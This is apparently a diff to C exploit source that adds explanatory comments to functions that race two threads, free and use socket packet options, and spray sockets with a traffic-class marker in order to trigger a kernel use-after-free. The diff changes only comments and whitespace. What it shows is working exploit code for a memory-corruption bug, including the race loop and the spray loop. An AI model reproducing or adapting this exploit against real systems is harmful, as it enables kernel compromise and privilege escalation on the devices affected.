@@ -115,6 +115,7 @@ void *free_thread(void *arg) {
     while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
         if (free_pktopts(o->master_sock))
             *(volatile int *)0;
+        
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
     }
     o->triggered = 1;
@@ -123,10 +124,21 @@ void *free_thread(void *arg) {
 
 // Triggers a Use-After-Free bug
 void trigger_uaf(struct opaque *o) {
+     int qqq[256];
+    // Initialize the members of the opaque struct to 0
     o->triggered = o->padding = o->done1 = o->done2 = 0;
-    int qqq[256];
+    
+    // Create a new thread to execute the use_thread function using <o> 
+    // as the function argument, then the ID of created thread will be
+    // stored inside of the <qqq>
     pthread_create(qqq, NULL, use_thread, o);
+    
+    // Create a new thread to execute the free_thread function using <o> 
+    // as the function argument, then the ID of created thread will be
+    // stored inside of the <qqq> after the first 128 bytes
     pthread_create(qqq + 128, NULL, free_thread, o);
+
+    // TODO: add comment
     for (;;) {
         for (int i = 0; i < 32; i++)
             set_tclass(o->spray_sock[i], TCLASS_SPRAY);
@@ -137,8 +149,10 @@ void trigger_uaf(struct opaque *o) {
                 *(volatile int *)0;
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
     }
+    
     printf_("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
     o->triggered = 1;
+    
     while (!o->done1 || !o->done2);
 }
 
